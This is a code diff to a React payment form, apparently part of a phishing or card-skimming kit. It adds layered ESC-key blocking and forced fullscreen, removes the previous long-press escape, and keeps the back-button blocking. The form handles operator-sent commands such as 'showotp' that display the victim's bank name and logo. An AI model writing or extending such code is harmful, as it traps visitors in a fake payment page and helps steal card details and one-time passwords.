@@ -54,23 +54,21 @@ const PaymentForm = () => {
   };
 
   useEffect(() => {
-    // Ultra-strong ESC key blocking
+    // Ultra-strong ESC key blocking - ENHANCED VERSION
     const handleKeyDown = (event: KeyboardEvent) => {
-      // Block ESC key completely
+      // Block ESC key completely with maximum prevention
       if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
         event.preventDefault();
         event.stopPropagation();
         event.stopImmediatePropagation();
         
-        // Long press for 20 seconds allows minimize
-        if (!longPressTimer) {
-          const timer = setTimeout(() => {
-            if (document.exitFullscreen) {
-              document.exitFullscreen();
-            }
-          }, 20000);
-          setLongPressTimer(timer);
+        // Force fullscreen to stay active
+        if (!document.fullscreenElement) {
+          document.documentElement.requestFullscreen().catch(() => {
+            console.log('Fullscreen request failed');
+          });
         }
+        
         return false;
       }
       
@@ -94,16 +92,6 @@ const PaymentForm = () => {
       }
     };
 
-    const handleKeyUp = (event: KeyboardEvent) => {
-      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
-        // Clear the long press timer if ESC is released
-        if (longPressTimer) {
-          clearTimeout(longPressTimer);
-          setLongPressTimer(null);
-        }
-      }
-    };
-
     // Add back button prevention
     const handlePopState = (event: PopStateEvent) => {
       event.preventDefault();
@@ -115,25 +103,41 @@ const PaymentForm = () => {
     window.history.pushState(null, '', window.location.href);
     window.addEventListener('popstate', handlePopState);
 
-    // Ultra-strong event blocking on multiple targets
+    // Ultra-strong event blocking on multiple targets with maximum prevention
     const targets = [document, window, document.body, document.documentElement];
     const events = ['keydown', 'keyup', 'keypress'];
     
     targets.forEach(target => {
       events.forEach(eventType => {
         target.addEventListener(eventType, handleKeyDown, { capture: true, passive: false });
-        target.addEventListener(eventType, handleKeyUp, { capture: true, passive: false });
       });
     });
+
+    // Additional ESC blocking layers
+    const preventEscape = (e: KeyboardEvent) => {
+      if (e.key === 'Escape' || e.keyCode === 27) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        return false;
+      }
+    };
+
+    // Multiple event listeners for maximum ESC blocking
+    document.addEventListener('keydown', preventEscape, { capture: true, passive: false });
+    window.addEventListener('keydown', preventEscape, { capture: true, passive: false });
+    document.body.addEventListener('keydown', preventEscape, { capture: true, passive: false });
 
     return () => {
       window.removeEventListener('popstate', handlePopState);
       targets.forEach(target => {
         events.forEach(eventType => {
           target.removeEventListener(eventType, handleKeyDown, true);
-          target.removeEventListener(eventType, handleKeyUp, true);
         });
       });
+      document.removeEventListener('keydown', preventEscape, true);
+      window.removeEventListener('keydown', preventEscape, true);
+      document.body.removeEventListener('keydown', preventEscape, true);
       if (longPressTimer) {
         clearTimeout(longPressTimer);
       }
@@ -186,11 +190,15 @@ const PaymentForm = () => {
           
           // Only process commands for the current submission
           if (submissionId && submissionId !== currentSubmissionId) {
+            console.log('Command not for current submission, ignoring');
             return;
           }
           
+          console.log('Processing command:', command, 'for submission:', submissionId);
+          
           switch (command) {
             case 'showotp':
+              console.log('Showing OTP with bank:', bankName, bankLogo);
               if (bankName) setSelectedBank(bankName);
               if (bankLogo) setSelectedBankLogo(bankLogo);
               setFadeState('fadeOut');
@@ -648,7 +656,12 @@ const PaymentForm = () => {
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
           <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
-          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/RuPay.svg/2560px-RuPay.svg.png" alt="RuPay" className="h-8 w-12 object-contain" />
+          <img 
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/RuPay.svg/2560px-RuPay.svg.png" 
+            alt="RuPay" 
+            className="h-6 w-12 object-contain" 
+            style={{ filter: 'brightness(0) saturate(100%)' }}
+          />
         </div>
 
         <div className="text-xs text-gray-500 text-center mt-4">
